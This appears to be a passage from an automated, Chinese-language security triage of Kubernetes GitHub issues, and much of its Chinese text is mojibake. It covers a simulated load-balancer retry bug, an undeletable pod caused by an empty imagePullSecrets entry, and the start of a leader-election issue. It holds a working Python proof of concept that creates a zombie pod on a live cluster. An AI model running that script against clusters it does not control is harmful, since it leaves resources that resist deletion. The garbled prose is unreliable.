        print(f"[Controller] ä» UpdateLoadBalancer æ”¶åˆ°é”™è¯¯: '{err}'")

    # æ­¥éª¤2: ç«‹å³è·å–è´Ÿè½½å‡è¡¡å™¨çŠ¶æ€ï¼Œè¿™æ˜¯æœ‰ç¼ºé™·çš„é€»è¾‘ç‚¹
    # GetLoadBalancerçš„è¿”å›å€¼è¦†ç›–äº†ä¹‹å‰çš„'err'å˜é‡
    print("[Controller] è°ƒç”¨ GetLoadBalancer...")
    _, err = cloud.get_load_balancer(service_name)
    if err is None:
        print("[Controller] ä» GetLoadBalancer æ”¶åˆ°æˆåŠŸå“åº” (nil error)ã€‚é”™è¯¯è¢«è¦†ç›–ï¼")

    # æ­¥éª¤3: åŸºäºæœ€ç»ˆçš„é”™è¯¯çŠ¶æ€å†³å®šæ˜¯å¦é‡è¯•
    if err is not None:
        print(f"[Controller] æœ€ç»ˆé”™è¯¯çŠ¶æ€ä¸º '{err}'ã€‚å°†æŠŠæœåŠ¡é‡æ–°å…¥é˜Ÿè¿›è¡Œé‡è¯•ã€‚")
        return True # è¡¨ç¤ºéœ€è¦é‡è¯•
    else:
        print("[Controller] æœ€ç»ˆé”™è¯¯çŠ¶æ€ä¸º nilã€‚è®¤ä¸ºæ›´æ–°æˆåŠŸï¼Œä¸ä¼šé‡è¯•ã€‚")
        print("[Controller] !!! ç¼ºé™·è§¦å‘ï¼šå°½ç®¡æ›´æ–°å¤±è´¥ï¼Œä½†æ§åˆ¶å™¨ä¸ä¼šé‡è¯• !!!")
        return False # è¡¨ç¤ºæ— éœ€é‡è¯•

def fixed_reconcile_service(cloud, service_name, desired_nodes):
    """
    æ¨¡æ‹Ÿä¿®å¤åçš„Service Controllerè°ƒå’Œé€»è¾‘ã€‚
    """
    print(f"\n--- è¿è¡Œä¿®å¤åçš„è°ƒå’Œé€»è¾‘ (fixed_reconcile_service) for {service_name} ---")

    # æ­¥éª¤1: å°è¯•æ›´æ–°è´Ÿè½½å‡è¡¡å™¨ï¼Œå°†å…¶é”™è¯¯å­˜å‚¨åœ¨ç‹¬ç«‹çš„å˜é‡ä¸­
    print("[Controller] è°ƒç”¨ UpdateLoadBalancer...")
    _, update_err = cloud.update_load_balancer(service_name, desired_nodes)
    if update_err:
        print(f"[Controller] ä» UpdateLoadBalancer æ”¶åˆ°é”™è¯¯: '{update_err}'")

    # æ­¥éª¤2: è°ƒç”¨GetLoadBalancerï¼Œå…¶é”™è¯¯çŠ¶æ€ä¸å½±å“ä¹‹å‰çš„åˆ¤æ–­
    print("[Controller] è°ƒç”¨ GetLoadBalancer...")
    status, get_err = cloud.get_load_balancer(service_name)
    if get_err:
        print(f"[Controller] GetLoadBalancer ä¹Ÿå¤±è´¥äº†: '{get_err}'")

    # æ­¥éª¤3: åŸºäºæ¥è‡ªUpdateLoadBalancerçš„åŸå§‹é”™è¯¯å†³å®šæ˜¯å¦é‡è¯•
    if update_err is not None:
        print(f"[Controller] æœ€ç»ˆé”™è¯¯çŠ¶æ€ä¸º '{update_err}' (æ¥è‡ªUpdateLoadBalancer)ã€‚å°†æŠŠæœåŠ¡é‡æ–°å…¥é˜Ÿè¿›è¡Œé‡è¯•ã€‚")
        print("[Controller] --- é€»è¾‘æ­£ç¡®ï¼šæ§åˆ¶å™¨å°†è¿›è¡Œé‡è¯• ---")
        return True # è¡¨ç¤ºéœ€è¦é‡è¯•
    else:
        print("[Controller] æœ€ç»ˆé”™è¯¯çŠ¶æ€ä¸º nilã€‚è®¤ä¸ºæ›´æ–°æˆåŠŸï¼Œä¸ä¼šé‡è¯•ã€‚")
        return False # è¡¨ç¤ºæ— éœ€é‡è¯•


def main():
    """
    ä¸»å‡½æ•°ï¼Œæ‰§è¡Œæ¨¡æ‹Ÿã€‚
    """
    # åˆå§‹åŒ–æ¨¡æ‹Ÿç¯å¢ƒ
    cloud_provider = MockCloudProvider()
    service_name = "my-web-app"
    initial_nodes = cloud_provider.load_balancer_state["nodes"]
    print(f"åˆå§‹çŠ¶æ€: LB for {service_name} has backends: {initial_nodes}")
    
    # æ¨¡æ‹Ÿé›†ç¾¤ä¸­åŠ å…¥äº†æ–°èŠ‚ç‚¹
    desired_nodes = ["node-1", "node-2", "node-3"]
    print(f"ç›®æ ‡çŠ¶æ€: å¸Œæœ› LB for {service_name} has backends: {desired_nodes}")

    # é…ç½®æ¨¡æ‹Ÿçš„äº‘æä¾›å•†ï¼Œä½¿å…¶åœ¨Updateæ—¶è¿”å›é”™è¯¯
    cloud_provider.force_update_error = True

    # è¿è¡Œæœ‰ç¼ºé™·çš„é€»è¾‘
    should_retry_flawed = flawed_reconcile_service(cloud_provider, service_name, desired_nodes)
    print(f"æœ‰ç¼ºé™·çš„é€»è¾‘æœ€ç»ˆå†³å®šæ˜¯å¦é‡è¯•: {should_retry_flawed}")
    print(f"å½“å‰LBå®é™…åç«¯: {cloud_provider.load_balancer_state['nodes']} (é…ç½®æœªæ›´æ–°)")

    # è¿è¡Œä¿®å¤åçš„é€»è¾‘
    should_retry_fixed = fixed_reconcile_service(cloud_provider, service_name, desired_nodes)
    print(f"ä¿®å¤åçš„é€»è¾‘æœ€ç»ˆå†³å®šæ˜¯å¦é‡è¯•: {should_retry_fixed}")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿°Pythonè„šæœ¬æ˜¯ä¸€ä¸ªæ¦‚å¿µéªŒè¯ï¼ˆProof of Conceptï¼‰ï¼Œå®ƒå¹¶ä¸å®é™…æ“ä½œKubernetesé›†ç¾¤ï¼Œè€Œæ˜¯é€šè¿‡æ¨¡æ‹Ÿæ¥æ¸…æ™°åœ°å±•ç¤ºIssueä¸­æè¿°çš„é€»è¾‘ç¼ºé™·ã€‚

1.  **`MockCloudProvider` ç±»**: è¿™ä¸ªç±»æ¨¡æ‹Ÿäº†äº‘æœåŠ¡å•†çš„è¡Œä¸ºã€‚å®ƒåŒ…å« `update_load_balancer` å’Œ `get_load_balancer` ä¸¤ä¸ªæ–¹æ³•ã€‚é€šè¿‡è®¾ç½® `force_update_error = True`ï¼Œæˆ‘ä»¬å¯ä»¥è®© `update_load_balancer` æ–¹æ³•æ¨¡æ‹Ÿä¸€æ¬¡å¤±è´¥çš„APIè°ƒç”¨ï¼Œå¹¶è¿”å›ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œè¿™æ­£æ˜¯å¤ç°é—®é¢˜çš„å…³é”®å‰æã€‚

2.  **`flawed_reconcile_service` å‡½æ•°**: æ­¤å‡½æ•°ä¸¥æ ¼æŒ‰ç…§Issueä¸­æè¿°çš„å­˜åœ¨ç¼ºé™·çš„é€»è¾‘è¿›è¡Œç¼–ç ã€‚å®ƒé¦–å…ˆè°ƒç”¨ `update_load_balancer` å¹¶å°†å…¶è¿”å›å€¼ï¼ˆåŒ…æ‹¬é”™è¯¯ï¼‰å­˜å…¥å˜é‡ `err`ã€‚ç´§æ¥ç€ï¼Œå®ƒè°ƒç”¨ `get_load_balancer`ï¼Œå¹¶å°†è¿™æ¬¡è°ƒç”¨çš„è¿”å›å€¼å†æ¬¡å­˜å…¥*åŒä¸€ä¸ª* `err` å˜é‡ï¼Œä»è€Œè¦†ç›–äº†ä¹‹å‰çš„å€¼ã€‚åœ¨æˆ‘ä»¬çš„æ¨¡æ‹Ÿåœºæ™¯ä¸­ï¼Œ`update_load_balancer` è¿”å›é”™è¯¯ï¼Œè€Œ `get_load_balancer` è¿”å›æˆåŠŸï¼ˆ`err`ä¸º`None`ï¼‰ã€‚å› æ­¤ï¼Œå‡½æ•°æœ€åæ£€æŸ¥ `err` æ—¶ï¼Œä¼šé”™è¯¯åœ°è®¤ä¸ºæ•´ä¸ªæ“ä½œæˆåŠŸäº†ï¼Œå¹¶æ‰“å°å‡ºâ€œä¸ä¼šé‡è¯•â€çš„æ¶ˆæ¯ã€‚è¿™ç²¾ç¡®åœ°å¤ç°äº†é—®é¢˜ã€‚

3.  **`fixed_reconcile_service` å‡½æ•°**: æ­¤å‡½æ•°å±•ç¤ºäº†ä¿®å¤åçš„æ­£ç¡®é€»è¾‘ï¼Œå³ä½¿ç”¨ä¸åŒçš„å˜é‡ï¼ˆ`update_err` å’Œ `get_err`ï¼‰æ¥å­˜å‚¨ä¸¤æ¬¡APIè°ƒç”¨çš„é”™è¯¯ã€‚è¿™æ ·ï¼Œå³ä½¿ `get_load_balancer` æˆåŠŸï¼Œ`update_load_balancer` çš„é”™è¯¯çŠ¶æ€ `update_err` ä¹Ÿå¾—ä»¥ä¿ç•™ã€‚å‡½æ•°æœ€åæ£€æŸ¥ `update_err`ï¼Œæ­£ç¡®åœ°åˆ¤æ–­å‡ºæ›´æ–°æ“ä½œå¤±è´¥äº†ï¼Œå¹¶å†³å®šéœ€è¦é‡è¯•ã€‚

4.  **`main` å‡½æ•°**: è¿™æ˜¯è„šæœ¬çš„å…¥å£ç‚¹ã€‚å®ƒè®¾ç½®äº†åˆå§‹åœºæ™¯ï¼ˆä¸€ä¸ªLBåªæœ‰ä¸€ä¸ªåç«¯èŠ‚ç‚¹ï¼‰ï¼Œç„¶åå®šä¹‰äº†ç›®æ ‡çŠ¶æ€ï¼ˆLBåº”æœ‰ä¸‰ä¸ªåç«¯èŠ‚ç‚¹ï¼‰ã€‚é€šè¿‡è°ƒç”¨æœ‰ç¼ºé™·å’Œä¿®å¤åçš„ä¸¤ä¸ªå‡½æ•°ï¼Œå¹¶æ‰“å°å‡ºå®ƒä»¬çš„å†³ç­–å’Œæœ€ç»ˆçš„LBçŠ¶æ€ï¼Œè„šæœ¬çš„è¾“å‡ºå¯ä»¥ç›´è§‚åœ°å¯¹æ¯”ä¸¤ç§é€»è¾‘çš„å·®å¼‚ï¼Œè¯æ˜äº†è¯¥ç¼ºé™·çš„å­˜åœ¨åŠå…¶å½±å“ã€‚

æ€»ä¹‹ï¼Œè¯¥è„šæœ¬é€šè¿‡ä¸€ä¸ªéš”ç¦»çš„ã€å¯æ§çš„æ¨¡æ‹Ÿç¯å¢ƒï¼ŒæˆåŠŸå¤ç°äº†å› é”™è¯¯å˜é‡è¢«è¦†ç›–è€Œå¯¼è‡´æœåŠ¡æ›´æ–°é‡è¯•æœºåˆ¶å¤±æ•ˆçš„æ ¹æœ¬åŸå› ã€‚

---


## Issue #131657 cannot delete pod with finalizer and invalid imagePullSecrets

- Issue é“¾æ¥ï¼š[#131657](https://github.com/kubernetes/kubernetes/issues/131657)

### Issue å†…å®¹

#### What happened?

A `batch/v1:Job` was created that generated a pod with an invalid `.spec.imagePullSecrets` block:

```
metadata:
  finalizers:
  - "batch.kubernetes.io/job-tracking"
spec:
  imagePullSecrets:
    - {}
```

This pod is now stuck in a `ContainerStatusUnknown` state and cannot be deleted.

Conventional wisdom is to delete the finalizer, right? Weeeeeell that busted imagePullSecrets causes that to fail:

```
kubectl patch -n NAMESPACE pod POD_NAME --type='json' -p='[{"op":"remove","path":"/metadata/finalizers/0"}]'
The Pod "POD_NAME" is invalid: spec: Forbidden: pod updates may not change fields other than `spec.containers[*].image`,`spec.initContainers[*].image`,`spec.activeDeadlineSeconds`,`spec.tolerations` (only additions to existing tolerations),`spec.terminationGracePeriodSeconds` (allow it to be set to 1 if it was previously negative)
  core.PodSpec{
        ... // 11 identical fields
        NodeName:         "NODE_NAME",
        SecurityContext:  &{HostPID: true},
-       ImagePullSecrets: []core.LocalObjectReference{{}},
+       ImagePullSecrets: []core.LocalObjectReference{},
        Hostname:         "",
        Subdomain:        "",
        ... // 18 identical fields
  }
```

I've tried to add an explicit patch that would result in `ImagePullSecrets` not getting modified, but it gets optimized down to `[]core.LocalObjectReference{}` no matter what I do.

I've also tried rolling the node the pod was scheduled for, which did nothing.

The pod was created under EKS 1.31, I have just updated the cluster to 1.32 

#### What did you expect to happen?

I expected the finalizer patch to succeed

#### How can we reproduce it (as minimally and precisely as possible)?

I'm not looking to create _more_ zombie pods, so I'm not sure this will work.

Note that the `.spec.containers[0].image` being a nonexistent image may be relevant, it's part of why it got into the `ContainerStatusUnknown` state in the first place.

```
---
apiVersion: batch/v1
kind: Job
metadata:
  name: bad-job-no-donut
  namespace: default
spec:
  template:
    metadata:
      finalizers:
      - "batch.kubernetes.io/job-tracking"
    spec:
      containers:
      - image: nonexistent/image
        name: broken-container
      restartPolicy: Never
      imagePullSecrets:
      - {}
```

#### Anything else we need to know?

This is an AWS EKS cluster

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.3
Kustomize Version: v5.5.0
Server Version: v1.32.3-eks-4096722
```

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
I have no idea what OS the EKS backplane is running on. Probably amazon linux 2. the workers are running amazon linux 2 
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªç”±äºKubernetes APIæœåŠ¡å™¨åœ¨å¤„ç†Podæ›´æ–°è¯·æ±‚æ—¶çš„ä¸ä¸€è‡´éªŒè¯é€»è¾‘è€Œå¯¼è‡´çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰é—®é¢˜ã€‚

å…·ä½“åˆ†æå¦‚ä¸‹ï¼š
1.  **é—®é¢˜æ ¹æº**ï¼šç”¨æˆ·é€šè¿‡ä¸€ä¸ª`Job`åˆ›å»ºäº†ä¸€ä¸ª`Pod`ï¼Œè¯¥`Pod`çš„`spec.imagePullSecrets`å­—æ®µåŒ…å«äº†ä¸€ä¸ªæ— æ•ˆçš„ç©ºå¯¹è±¡ `[{}]`ã€‚åœ¨åˆ›å»ºæ—¶ï¼ŒAPIæœåŠ¡å™¨æ¥å—äº†è¿™ä¸ªæ— æ•ˆçš„é…ç½®ã€‚
2.  **è§¦å‘æ¡ä»¶**ï¼šè¯¥`Pod`å› ä¸ºé…ç½®äº†ä¸å­˜åœ¨çš„é•œåƒå’Œä¸Šè¿°æ— æ•ˆé…ç½®ï¼Œè¿›å…¥äº†`ContainerStatusUnknown`çš„å¡æ­»çŠ¶æ€ã€‚åŒæ—¶ï¼Œè¯¥`Pod`ç”±`Job`æ§åˆ¶å™¨ç®¡ç†ï¼Œå…¶`metadata`ä¸­åŒ…å«ä¸€ä¸ª`finalizer`ï¼ˆ`batch.kubernetes.io/job-tracking`ï¼‰ã€‚`finalizer`çš„å­˜åœ¨ä¼šé˜»æ­¢`Pod`è¢«ç›´æ¥åˆ é™¤ï¼Œç›´åˆ°`finalizer`è¢«ç§»é™¤ã€‚
3.  **æ ¸å¿ƒç¼ºé™·**ï¼šå½“ç”¨æˆ·å°è¯•é€šè¿‡`patch`æ“ä½œç§»é™¤`finalizer`ä»¥æ‰‹åŠ¨åˆ é™¤å¡æ­»çš„`Pod`æ—¶ï¼ŒAPIæœåŠ¡å™¨æ‹’ç»äº†è¯¥è¯·æ±‚ã€‚é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºï¼ŒAPIæœåŠ¡å™¨åœ¨å¤„ç†`patch`è¯·æ±‚æ—¶ï¼Œä¸ä»…åº”ç”¨äº†`patch`æœ¬èº«ï¼Œè¿˜é‡æ–°éªŒè¯å’Œè§„èŒƒåŒ–äº†æ•´ä¸ª`Pod Spec`ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå®ƒè¯•å›¾å°†æ— æ•ˆçš„`spec.imagePullSecrets: [{}]`ä¿®æ­£ä¸º`spec.imagePullSecrets: []`ã€‚ç„¶è€Œï¼Œ`spec.imagePullSecrets`æ˜¯ä¸€ä¸ªä¸å¯å˜ï¼ˆimmutableï¼‰å­—æ®µï¼Œä»»ä½•å¯¹å…¶çš„æ›´æ”¹éƒ½ä¼šå¯¼è‡´æ›´æ–°å¤±è´¥ã€‚å› æ­¤ï¼Œç§»é™¤`finalizer`çš„åˆæ³•æ“ä½œå› ä¸ºå¯¹ä¸å¯å˜å­—æ®µçš„éšå¼ã€é™„å¸¦ä¿®æ”¹è€Œè¢«æ‹’ç»ã€‚
4.  **å®‰å…¨å½±å“**ï¼šè¿™ä¸ªé—®é¢˜æ„æˆäº†ä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDenial of Serviceï¼‰ã€‚ä¸€ä¸ªæ‹¥æœ‰åœ¨å‘½åç©ºé—´å†…åˆ›å»º`Job`æˆ–`Pod`æƒé™ï¼ˆè¿™åœ¨å¤šç§Ÿæˆ·é›†ç¾¤ä¸­æ˜¯å¸¸è§æƒé™ï¼‰çš„æ™®é€šç”¨æˆ·æˆ–æœåŠ¡è´¦æˆ·ï¼Œå¯ä»¥æ•…æ„åˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ— æ•ˆ`imagePullSecrets`å’Œ`finalizer`çš„`Pod`ã€‚è¿™ä¸ª`Pod`å°†å˜æˆä¸€ä¸ªæ— æ³•é€šè¿‡æ ‡å‡†APIåˆ é™¤çš„â€œåƒµå°¸èµ„æºâ€ï¼Œæ°¸ä¹…æ€§åœ°ï¼ˆé™¤éç®¡ç†å‘˜æ‰‹åŠ¨å¹²é¢„etcdï¼‰æ¶ˆè€—é›†ç¾¤çš„å…ƒæ•°æ®å­˜å‚¨ç©ºé—´ï¼Œå¹¶å¯¹é›†ç¾¤ç®¡ç†é€ æˆå›°æ‰°ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¯„ä¼°ï¼š
*   **Attack Vector (AV): Network** - é€šè¿‡K8s APIè¿›è¡Œæ”»å‡»ã€‚
*   **Attack Complexity (AC): Low** - å¤ç°è¯¥é—®é¢˜æ‰€éœ€çš„YAMLé…ç½®éå¸¸ç®€å•ã€‚
*   **Privileges Required (PR): Low** - ä»…éœ€è¦åˆ›å»º`Job`æˆ–`Pod`çš„æƒé™ï¼Œå±äºå¼€å‘äººå‘˜æˆ–CI/CDæµæ°´çº¿çš„å¸¸è§„æƒé™ã€‚
*   **User Interaction (UI): None** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Unchanged** - æ¼æ´å½±å“æ§åˆ¶å¹³é¢ç»„ä»¶å¯¹ç‰¹å®šèµ„æºçš„ç®¡ç†ï¼Œä½†æœªçªç ´å®‰å…¨è¾¹ç•Œã€‚
*   **Confidentiality (C): None** - ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€‚
*   **Integrity (I): Low** - å½±å“äº†é›†ç¾¤çŠ¶æ€ç®¡ç†çš„å®Œæ•´æ€§ï¼ˆèµ„æºæ— æ³•åˆ é™¤ï¼‰ï¼Œä½†æœªç ´åå…¶ä»–æ•°æ®ã€‚
*   **Availability (A): Low** - å¯¼è‡´ç‰¹å®š`Pod`èµ„æºçš„ç®¡ç†åŠŸèƒ½ä¸å¯ç”¨ï¼Œä½†ä¸ä¼šå½±å“æ•´ä¸ªé›†ç¾¤æˆ–å…¶ä»–æœåŠ¡çš„å¯ç”¨æ€§ã€‚

ç»¼åˆè¯„åˆ†ä¸º **5.4 (Medium)**ã€‚æ ¹æ®é¡¹ç›®æ–¹æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼ŒCVSSè¯„çº§åœ¨highï¼ˆ>=7.0ï¼‰ä»¥ä¸‹ï¼Œä¸”å±äºéœ€è¦ä¸€å®šæƒé™æ‰èƒ½å‘èµ·çš„DoSæ”»å‡»ï¼Œå› æ­¤åº”è¢«åˆ¤æ–­ä¸º **ä½é£é™©**ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import os
import random
import string
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def generate_random_suffix(length=6):
    """ç”Ÿæˆä¸€ä¸ªéšæœºçš„å­—æ¯å’Œæ•°å­—åç¼€ã€‚"""
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def main():
    """
    POCè„šæœ¬ï¼Œç”¨äºå¤ç°å› æ— æ•ˆimagePullSecretså’Œfinalizerå¯¼è‡´çš„Podæ— æ³•åˆ é™¤é—®é¢˜ã€‚
    """
    # è„šæœ¬æ€»æ‰§è¡Œè¶…æ—¶æ—¶é—´
    script_start_time = time.time()
    script_timeout = 120  # 2åˆ†é’Ÿ

    # 1. åŠ è½½Kubernetesé…ç½®
    try:
        config.load_kube_config()
        print("Kubernetes é…ç½®åŠ è½½æˆåŠŸã€‚")
    except config.ConfigException:
        print("æ— æ³•æ‰¾åˆ°kubeconfigæ–‡ä»¶ã€‚è¯·ç¡®ä¿å®ƒä½äºé»˜è®¤ä½ç½® (~/.kube/config) æˆ–å·²è®¾ç½®KUBECONFIGç¯å¢ƒå˜é‡ã€‚")
        return

    # 2. åˆ›å»ºAPIå®¢æˆ·ç«¯
    core_v1 = client.CoreV1Api()
    batch_v1 = client.BatchV1Api()

    # 3. å®šä¹‰æœ‰é—®é¢˜çš„Job
    namespace = "default"
    job_name = f"bad-job-poc-{generate_random_suffix()}"
    print(f"å°†åœ¨å‘½åç©ºé—´ '{namespace}' ä¸­ä½¿ç”¨Jobåç§°: {job_name}")

    job_manifest = {
        "apiVersion": "batch/v1",
        "kind": "Job",
        "metadata": {"name": job_name},
        "spec": {
            "template": {
                "metadata": {
                    # è¿™ä¸ªfinalizerä¼šé˜»æ­¢Podè¢«ç«‹å³åˆ é™¤
                    "finalizers": ["batch.kubernetes.io/job-tracking"]
                },
                "spec": {
                    "containers": [{
                        "name": "broken-container",
                        "image": "nonexistent/image:1.0.0"  # ä¸å­˜åœ¨çš„é•œåƒ
                    }],
                    "restartPolicy": "Never",
                    # é—®é¢˜çš„æ ¸å¿ƒï¼šä¸€ä¸ªæ— æ•ˆçš„ç©ºå¯¹è±¡æ¡ç›®
                    "imagePullSecrets": [{}]
                }
            }
        }
    }

    # 4. åˆ›å»ºJob
    try:
        print(f"æ­£åœ¨åˆ›å»ºJob '{job_name}'...")
        batch_v1.create_namespaced_job(body=job_manifest, namespace=namespace)
        print("Jobåˆ›å»ºæˆåŠŸã€‚")
    except ApiException as e:
        print(f"åˆ›å»ºJobæ—¶å‡ºé”™: {e}")
        return

    # 5. ç­‰å¾…Jobæ§åˆ¶å™¨åˆ›å»ºPod
    pod_name = None
    pod_label_selector = f"job-name={job_name}"
    print(f"æ­£åœ¨ç­‰å¾…Podï¼ˆæ ‡ç­¾é€‰æ‹©å™¨: '{pod_label_selector}'ï¼‰è¢«åˆ›å»º...")
    
    wait_start_time = time.time()
    while time.time() - wait_start_time < 60:  # ç­‰å¾…60ç§’
        if time.time() - script_start_time > script_timeout:
            print("è„šæœ¬æ‰§è¡Œè¶…æ—¶ã€‚")
            break
        
        try:
            pods = core_v1.list_namespaced_pod(namespace=namespace, label_selector=pod_label_selector)
            if pods.items:
                pod_name = pods.items[0].metadata.name
                pod_status = pods.items[0].status.phase
                print(f"æ‰¾åˆ°Pod: '{pod_name}'ï¼ŒçŠ¶æ€: '{pod_status}'")
                break
        except ApiException as e:
            print(f"åˆ—å‡ºPodæ—¶å‡ºé”™: {e}")
        time.sleep(5)
    
    if not pod_name:
        print("è¶…æ—¶ï¼šJobæ§åˆ¶å™¨åœ¨60ç§’å†…æœªåˆ›å»ºPodã€‚")
        # å°è¯•æ¸…ç†Job
        try:
            print(f"æ­£åœ¨æ¸…ç†Job '{job_name}'...")
            batch_v1.delete_namespaced_job(name=job_name, namespace=namespace, propagation_policy='Background')
        except ApiException as e:
            print(f"æ¸…ç†Jobå¤±è´¥: {e}")
        return

    # 6. å°è¯•ç§»é™¤Podçš„finalizerï¼ˆé¢„æœŸä¼šå¤±è´¥ï¼‰
    print(f"\n--- å…³é”®å¤ç°æ­¥éª¤ï¼šå°è¯•ç§»é™¤Pod '{pod_name}' çš„finalizer ---")
    # æ³¨æ„ï¼šè¿™é‡Œçš„pathç´¢å¼•å¯èƒ½æ˜¯0æˆ–å…¶ä»–çš„ï¼Œå–å†³äºPodä¸Šæ˜¯å¦æœ‰å…¶ä»–finalizerã€‚å¯¹äºè¿™ä¸ªJobåˆ›å»ºçš„Podï¼Œå®ƒåº”è¯¥æ˜¯ç¬¬ä¸€ä¸ªã€‚
    patch_body = [{"op": "remove", "path": "/metadata/finalizers/0"}]
    
    try:
        core_v1.patch_namespaced_pod(name=pod_name, namespace=namespace, body=patch_body)
        print("!!! éé¢„æœŸæˆåŠŸï¼šfinalizerè¢«æˆåŠŸç§»é™¤ã€‚æ‚¨å½“å‰ä½¿ç”¨çš„K8sç‰ˆæœ¬å¯èƒ½å·²ç»ä¿®å¤äº†æ­¤æ¼æ´ã€‚")
    except ApiException as e:
        print(">>> å¤ç°æˆåŠŸï¼šæ­£å¦‚é¢„æœŸï¼Œpatchæ“ä½œå¤±è´¥ã€‚")
        print(f"APIæœåŠ¡å™¨è¿”å›çŠ¶æ€ç : {e.status}")
        print("APIæœåŠ¡å™¨è¿”å›çš„é”™è¯¯ä¿¡æ¯ç‰‡æ®µ:")
        # æ‰“å°éƒ¨åˆ†bodyï¼Œå› ä¸ºå®ƒå¯èƒ½å¾ˆé•¿
        print(e.body[:500] + "...")
        print("\nè¿™ä¸ªå¤±è´¥ç¡®è®¤äº†æ¼æ´çš„å­˜åœ¨ã€‚APIæœåŠ¡å™¨åœ¨ç§»é™¤finalizeræ—¶ï¼Œè¯•å›¾éšå¼ä¿®æ”¹ä¸å¯å˜çš„'imagePullSecrets'å­—æ®µï¼Œå¯¼è‡´è¯·æ±‚è¢«æ‹’ç»ã€‚")

    # 7. æ¸…ç†è¯´æ˜
    print(f"\n--- POCæ‰§è¡Œå®Œæ¯• ---")
    print(f"Job '{job_name}' å’Œå…¶å…³è”çš„Pod '{pod_name}' å·²è¢«åˆ›å»ºã€‚")
    print(f"Pod '{pod_name}' ç°åœ¨å¤„äºä¸€ä¸ªæ— æ³•é€šè¿‡å¸¸è§„APIåˆ é™¤çš„â€œåƒµå°¸â€çŠ¶æ€ã€‚")
    print("è¦è¿›è¡Œæ¸…ç†ï¼Œéœ€è¦å…ˆåˆ é™¤Jobï¼Œç„¶åé€šè¿‡å¼ºåˆ¶åˆ é™¤çš„æ–¹å¼ç§»é™¤Podã€‚")
    print("æ­£åœ¨å°è¯•ä»¥åå°æ¨¡å¼åˆ é™¤Jobï¼ˆPodå°†è¢«ä¿ç•™ï¼‰...")
    try:
        batch_v1.delete_namespaced_job(
            name=job_name,
            namespace=namespace,
            body=client.V1DeleteOptions(propagation_policy='Background')
        )
        print(f"Job '{job_name}' å·²åˆ é™¤ã€‚åƒµå°¸Pod '{pod_name}' ä»ç„¶å­˜åœ¨ã€‚")
        print(f"æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¼ºåˆ¶åˆ é™¤è¯¥Pod: \nkubectl delete pod {pod_name} -n {namespace} --grace-period=0 --force")
    except ApiException as e:
        print(f"åˆ é™¤Job '{job_name}' å¤±è´¥: {e}")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


---


## Issue #131621 The network between kube-controller-manager and apiserver is abnormal, but the master node is not selected.

- Issue é“¾æ¥ï¼š[#131621](https://github.com/kubernetes/kubernetes/issues/131621)

### Issue å†…å®¹

#### What happened?

According to the kube-controller-manager log, the controller-manager fails to connect to the API server due to certain reasons. However, there is no log indicating that the master node fails to be selected, but only the log indicating that the watch request is disconnected. The configuration is leader-elect-lease-duration=20s. leader-elect-renew-deadline=15s

#### What did you expect to happen?

If the renewal-deadline time expires, the primary selection fails and the system is not suspended.

#### How can we reproduce it (as minimally and precisely as possible)?

N/A

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.31
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
æ­¤Issueæè¿°äº†Kubernetesæ§åˆ¶å¹³é¢ä¸­çš„ä¸€ä¸ªæ½œåœ¨çš„å¯é æ€§é—®é¢˜ã€‚`kube-controller-manager` åœ¨ä¸`kube-apiserver`çš„ç½‘ç»œè¿æ¥å¼‚å¸¸æ—¶ï¼Œå³ä½¿è¶…è¿‡äº†`leader-elect-renew-deadline`ï¼ˆç§Ÿçº¦ç»­è®¢æˆªæ­¢æ—¶é—´ï¼‰ï¼Œå½“å‰çš„leaderå®ä¾‹ä¹Ÿå¯èƒ½ä¸ä¼šæ”¾å¼ƒå…¶é¢†å¯¼åœ°ä½ã€‚

